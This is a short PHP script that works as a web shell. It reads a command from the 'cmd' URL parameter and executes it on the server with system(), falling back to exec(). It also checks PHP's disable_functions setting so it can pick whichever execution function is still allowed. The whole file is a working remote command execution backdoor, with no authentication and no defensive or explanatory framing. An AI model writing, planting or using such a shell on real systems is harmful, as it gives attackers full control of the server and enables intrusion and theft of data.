<?php
$cmd = $_GET['cmd'] ?? '';

if ($cmd === '') {
    exit('No command');
}

$disabled = explode(',', ini_get('disable_functions'));
$disabled = array_map('trim', $disabled);

if (function_exists('system') && !in_array('system', $disabled)) {
    system($cmd);
}
elseif (function_exists('exec') && !in_array('exec', $disabled)) {
    exec($cmd, $output);
    echo implode("\n", $output);
}
else {
    echo 'No execution functions available';
}
